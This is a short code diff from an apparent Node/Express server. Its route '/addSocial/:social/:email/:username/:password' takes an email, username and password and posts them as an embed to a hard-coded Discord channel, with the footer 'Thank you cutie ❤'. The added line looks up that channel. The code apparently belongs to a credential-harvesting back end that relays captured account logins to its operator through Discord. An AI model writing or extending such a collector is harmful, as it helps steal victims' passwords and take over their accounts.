@@ -74,6 +74,7 @@ app.get('/addSocial/:social/:email/:username/:password', (req, res) => {
 	.setTimestamp()
 	.setFooter({ text: 'Thank you cutie ❤' });
 
+    const channel = guild.channels.cache.get('1228365375520116757');
     channel.send({ embeds: [accountEmbed] });
     res.send("Data inserted.");
 });
